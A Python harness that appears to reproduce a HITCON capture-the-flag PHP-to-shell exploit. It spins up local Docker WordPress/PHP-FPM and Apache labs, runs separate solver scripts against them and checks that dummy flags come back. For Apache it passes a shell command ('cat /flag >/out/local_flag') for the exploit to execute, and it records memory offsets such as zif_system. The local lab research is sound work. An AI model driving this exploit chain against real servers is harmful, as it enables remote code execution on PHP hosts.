#!/usr/bin/env python3

import argparse
import json
import os
import secrets
import shlex
import socket
import subprocess
import sys
import time
from pathlib import Path

from profile_registry import PROFILES, profile_by_name, support_contract

ROOT = Path(__file__).resolve().parent
INSTALLER = ROOT / "lab" / "install.py"
SELECTOR = ROOT / "select_profile.py"
VERIFIED_NAMES = tuple(profile.name for profile in PROFILES if profile.verified)
FIXED_PORTS = {"fpm84": 18235, "fpm85": 18233}


def info(text):
    print(f"[*] {text}", flush=True)


def good(text):
    print(f"[+] {text}", flush=True)


def run(
    command,
    *,
    cwd=ROOT,
    env=None,
    timeout=1800,
    check=True,
    capture=False,
):
    shown = " ".join(shlex.quote(str(item)) for item in command)
    info(shown)
    result = subprocess.run(
        [str(item) for item in command],
        cwd=cwd,
        env=env,
        timeout=timeout,
        check=False,
        stdout=subprocess.PIPE if capture else None,
        stderr=subprocess.PIPE if capture else None,
        text=capture,
    )
    if check and result.returncode:
        detail = ""
        if capture:
            detail = f": {(result.stderr or result.stdout).strip()[:500]}"
        raise RuntimeError(
            f"command failed with exit code {result.returncode}: {shown}{detail}"
        )
    return result


def compose(docker, project, directory, env, *args, check=True, timeout=1800):
    return run(
        [*docker, "compose", "-p", project, *args],
        cwd=directory,
        env=env,
        timeout=timeout,
        check=check,
    )


def down(docker, project, directory, env):
    compose(
        docker,
        project,
        directory,
        env,
        "down",
        "-v",
        "--remove-orphans",
        check=False,
        timeout=180,
    )


def free_port(port):
    sock = socket.socket()
    try:
        sock.bind(("127.0.0.1", port))
        return True
    except OSError:
        return False
    finally:
        sock.close()


def wait_for_free_port(port, timeout=15.0):
    deadline = time.monotonic() + timeout
    while not free_port(port):
        if time.monotonic() >= deadline:
            return False
        time.sleep(0.25)
    return True



def fresh_sid(prefix):
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    suffix = "".join(secrets.choice(chars) for _ in range(15 - len(prefix)))
    return prefix + suffix


def windows_environment(env, *names):
    inherited = [item for item in env.get("WSLENV", "").split(":") if item]
    for name in names:
        if name not in inherited:
            inherited.append(name)
    env["WSLENV"] = ":".join(inherited)
    return env


def profile_environment(profile, port):
    env = os.environ.copy()
    env.update(
        {
            "LAB_PORT": str(port),
            "DB_NAME": f"wp_{profile.name}",
            "DB_USER": "wp_lab",
            "DB_PASSWORD": secrets.token_urlsafe(24),
            "DB_ROOT_PASSWORD": secrets.token_urlsafe(24),
            "LOCAL_FLAG": profile.flag,
        }
    )
    return windows_environment(
        env,
        "LAB_PORT",
        "DB_NAME",
        "DB_USER",
        "DB_PASSWORD",
        "DB_ROOT_PASSWORD",
        "LOCAL_FLAG",
    )


def verify_fingerprint(docker_text, profile):
    result = run(
        [
            sys.executable,
            SELECTOR,
            "--container",
            profile.container,
            "--sapi",
            profile.fingerprint.sapi,
            "--docker-command",
            docker_text,
        ],
        timeout=90,
        capture=True,
    )
    selected = json.loads(result.stdout)
    if selected.get("profile") != profile.name or not selected.get("supported"):
        raise RuntimeError(
            f"fingerprint selected {selected.get('profile')!r}, expected {profile.name!r}"
        )
    return selected["fingerprint"]


def run_fpm_profile(docker, docker_text, profile, port, attempts, root, keep_lab):
    runner = profile.runner_dict(attempts=attempts)
    project = f"php2shell-{profile.name}-local"
    env = profile_environment(profile, port)

    for attempt in range(1, attempts + 1):
        output = root / profile.name / f"attempt-{attempt:02d}"
        down(docker, project, profile.lab, env)
        try:
            info(f"building {profile.name} on port {port} for attempt {attempt}")
            compose(docker, project, profile.lab, env, "up", "-d", "--build")
            run(
                [
                    sys.executable,
                    INSTALLER,
                    "--port",
                    str(port),
                    "--title",
                    profile.title,
                ],
                timeout=180,
            )
            fingerprint = verify_fingerprint(docker_text, profile)
            command = [
                sys.executable,
                profile.solver,
                "--execute",
                "--restart-at-start",
                "--port",
                str(port),
                "--container",
                profile.container,
                "--docker-command",
                docker_text,
                "--sid",
                fresh_sid(runner["sid_prefix"]),
                "--output-dir",
                output,
                "--expected-marker",
                profile.flag,
                *runner["extra_solver_args"],
            ]
            completed = run(command, timeout=1200, check=False)
            result_path = output / "result.json"
            if completed.returncode or not result_path.is_file():
                info(f"{profile.name} attempt {attempt} missed")
                continue
            result = json.loads(result_path.read_text())
            responses = list(output.glob(runner["response_pattern"]))
            if not result.get("success") or len(responses) != 1:
                info(f"{profile.name} attempt {attempt} left no unique GET proof")
                continue
            response = responses[0].read_bytes()
            if profile.flag.encode() not in response:
                info(f"{profile.name} attempt {attempt} response missed its dummy flag")
                continue
            good(f"{profile.name}: {profile.flag}")
            profile_result = {
                "profile": profile.name,
                "stack": profile.stack,
                "port": port,
                "attempt": attempt,
                "flag": profile.flag,
                "B": result["B"],
                "r2a_p_offset": result["r2a_p_offset"],
                "r2b_p_offset": result["r2b_p_offset"],
                "r3_q_offset": result["r3_q_offset"],
                "fingerprint": fingerprint,
                "result": str(result_path.resolve()),
            }
            for key in (
                "r2a_big_value_offset",
                "r2b_big_value_offset",
                "r3_big_value_offset",
            ):
                if key in result:
                    profile_result[key] = result[key]
            return profile_result
        finally:
            if not keep_lab:
                down(docker, project, profile.lab, env)
    raise RuntimeError(f"{profile.name} failed after {attempts} clean attempts")


def run_apache_profile(
    docker,
    docker_text,
    profile,
    port,
    attempts,
    workers,
    root,
    keep_lab,
):
    project = f"php2shell-{profile.name}-local"
    env = profile_environment(profile, port)
    proof_dir = profile.lab / "proofs"
    proof_dir.mkdir(parents=True, exist_ok=True)
    try:
        proof_dir.chmod(0o777)
    except OSError:
        pass
    proof = proof_dir / "local_flag"
    if proof.exists():
        proof.unlink()

    down(docker, project, profile.lab, env)
    try:
        info(f"building {profile.name} on port {port}")
        compose(docker, project, profile.lab, env, "up", "-d", "--build")
        run(
            [
                sys.executable,
                INSTALLER,
                "--port",
                str(port),
                "--title",
                profile.title,
            ],
            timeout=180,
        )
        info(f"restarting {profile.container} after WordPress installation")
        run([*docker, "restart", profile.container], timeout=120)
        time.sleep(2)
        fingerprint = verify_fingerprint(docker_text, profile)

        for attempt in range(1, attempts + 1):
            if proof.exists():
                proof.unlink()
            if attempt > 1:
                info(f"restarting {profile.container} for attempt {attempt}")
                run([*docker, "restart", profile.container], timeout=120)
                time.sleep(2)

            output = root / profile.name / f"attempt-{attempt:02d}"
            result = run(
                [
                    sys.executable,
                    profile.solver,
                    *profile.extra_solver_args,
                    "--execute",
                    "--port",
                    str(port),
                    "--workers",
                    str(workers),
                    "--proof",
                    proof,
                    "--output-dir",
                    output,
                    "--expected-marker",
                    profile.flag,
                    "--command",
                    "cat /flag >/out/local_flag",
                ],
                timeout=900,
                check=False,
            )
            result_path = output / "result.json"
            if result.returncode == 0 and result_path.is_file():
                data = json.loads(result_path.read_text())
                raw = proof.read_bytes() if proof.is_file() else b""
                if data.get("success") and profile.flag.encode() in raw:
                    saved = root / profile.name / "flag.txt"
                    saved.write_bytes(raw)
                    proof.unlink()
                    good(f"{profile.name}: {profile.flag}")
                    return {
                        "profile": profile.name,
                        "stack": profile.stack,
                        "port": port,
                        "attempt": attempt,
                        "flag": profile.flag,
                        "libphp": data["libphp"],
                        "main": data["main"],
                        "zif_system": data["zif_system"],
                        "fingerprint": fingerprint,
                        "result": str(result_path.resolve()),
                    }
            info(f"{profile.name} attempt {attempt} missed")
        raise RuntimeError(f"{profile.name} failed after {attempts} fresh-worker attempts")
    finally:
        if proof.exists():
            proof.unlink()
        if not keep_lab:
            down(docker, project, profile.lab, env)


def parse_overrides(parser, values, *, minimum, maximum, label):
    parsed = {}
    for item in values or []:
        name, separator, raw = item.partition("=")
        if not separator or name not in {profile.name for profile in PROFILES}:
            parser.error(f"{label} must use PROFILE=VALUE with a known profile")
        if name in parsed:
            parser.error(f"duplicate {label} override for {name}")
        try:
            value = int(raw)
        except ValueError:
            parser.error(f"{label} for {name} is not an integer")
        if not minimum <= value <= maximum:
            parser.error(f"{label} for {name} must be between {minimum} and {maximum}")
        parsed[name] = value
    return parsed


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--execute", action="store_true")
    parser.add_argument(
        "--docker-command", default=os.environ.get("PHP2SHELL_DOCKER_CMD", "docker")
    )
    parser.add_argument("--output-dir", type=Path)
    parser.add_argument(
        "--profile",
        action="append",
        choices=VERIFIED_NAMES,
        help="verified profile to run; repeat to select a subset (default: all)",
    )
    parser.add_argument("--port", action="append", metavar="PROFILE=PORT")
    parser.add_argument("--attempts", action="append", metavar="PROFILE=N")
    parser.add_argument("--workers", action="append", metavar="APACHE_PROFILE=N")
    parser.add_argument("--keep-labs", action="store_true")
    args = parser.parse_args()

    docker = shlex.split(args.docker_command)
    if not docker:
        parser.error("empty Docker command")
    names = args.profile or list(VERIFIED_NAMES)
    if len(names) != len(set(names)):
        parser.error("profiles must be unique")
    profiles = [profile_by_name(name) for name in names]
    port_overrides = parse_overrides(
        parser, args.port, minimum=1, maximum=65535, label="port"
    )
    attempt_overrides = parse_overrides(
        parser, args.attempts, minimum=1, maximum=5, label="attempts"
    )
    worker_overrides = parse_overrides(
        parser, args.workers, minimum=1, maximum=150, label="workers"
    )

    ports = {profile.name: port_overrides.get(profile.name, profile.default_port) for profile in profiles}
    attempts = {profile.name: attempt_overrides.get(profile.name, profile.attempts) for profile in profiles}
    workers = {profile.name: worker_overrides.get(profile.name, profile.workers) for profile in profiles}
    for name in worker_overrides:
        if profile_by_name(name).fingerprint.sapi != "apache2handler":
            parser.error(f"workers override is only valid for Apache profiles: {name}")
    for name, fixed in FIXED_PORTS.items():
        if name in ports and ports[name] != fixed:
            parser.error(f"{name} is calibrated only for loopback port {fixed}")
    if "fpm83" in ports and ports["fpm83"] < 10000:
        parser.error("fpm83 requires a five-digit loopback port")
    selected_ports = list(ports.values())
    if len(selected_ports) != len(set(selected_ports)):
        parser.error("selected loopback ports must be distinct")

    output = (
        args.output_dir or ROOT / "runs" / ("full-local-" + secrets.token_hex(4))
    ).resolve()
    plan_profiles = []
    for profile in profiles:
        row = {
            "name": profile.name,
            "sapi": profile.fingerprint.sapi,
            "port": ports[profile.name],
            "flag": profile.flag,
            "attempts": attempts[profile.name],
        }
        if profile.fingerprint.sapi == "apache2handler":
            row["workers"] = workers[profile.name]
        plan_profiles.append(row)
    plan = {
        "mode": "exact_local_profile_matrix",
        "acceptance": "one clean local dummy flag from every selected verified profile",
        "profiles": plan_profiles,
        "authentic_hitcon_artifacts": False,
        "live_requests": 0 if not args.execute else "bounded loopback only",
        "support_contract": support_contract(),
    }
    if not args.execute:
        print(json.dumps(plan, indent=2))
        return

    if output.exists():
        parser.error(f"output directory already exists: {output}")
    for port in selected_ports:
        if not wait_for_free_port(port):
            parser.error(f"loopback port {port} is already in use")

    output.mkdir(parents=True)
    summary = {**plan, "output_dir": str(output), "profiles": [], "success": False}
    (output / "journal.json").write_text(json.dumps(summary, indent=2) + "\n")
    try:
        for profile in profiles:
            if profile.fingerprint.sapi == "fpm":
                result = run_fpm_profile(
                    docker,
                    args.docker_command,
                    profile,
                    ports[profile.name],
                    attempts[profile.name],
                    output,
                    args.keep_labs,
                )
            else:
                result = run_apache_profile(
                    docker,
                    args.docker_command,
                    profile,
                    ports[profile.name],
                    attempts[profile.name],
                    workers[profile.name],
                    output,
                    args.keep_labs,
                )
            summary["profiles"].append(result)
            (output / "journal.json").write_text(json.dumps(summary, indent=2) + "\n")

        summary["success"] = True
        summary["flags"] = [profile["flag"] for profile in summary["profiles"]]
        total = len(summary["profiles"])
        summary["score"] = f"{total}/{total} local dummy flags across exact profiles"
        (output / "result.json").write_text(json.dumps(summary, indent=2) + "\n")
        (output / "journal.json").write_text(json.dumps(summary, indent=2) + "\n")
        print(json.dumps(summary, indent=2))
    except Exception as error:
        summary["error"] = f"{type(error).__name__}: {error}"
        (output / "journal.json").write_text(json.dumps(summary, indent=2) + "\n")
        raise


if __name__ == "__main__":
    main()
